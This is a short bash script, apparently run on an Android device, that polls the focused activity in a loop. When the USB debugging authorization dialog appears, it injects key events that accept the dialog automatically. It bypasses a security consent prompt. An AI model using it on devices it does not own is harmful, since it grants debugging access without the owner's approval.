#!/bin/bash

while [ 1 ]; do
        dumpsys activity activities  > tmp.txt
        grep "mFocusedActivity: ActivityRecord{.*com.android.systemui/.usb.UsbDebuggingActivity}" tmp.txt
        if [ $? -eq 0 ]; then
                input keyevent 22
                input keyevent 22
                input keyevent 66
                echo -n "Found\n" >> tmp1.txt
        fi
        rm tmp.txt
        sleep 0.1
done

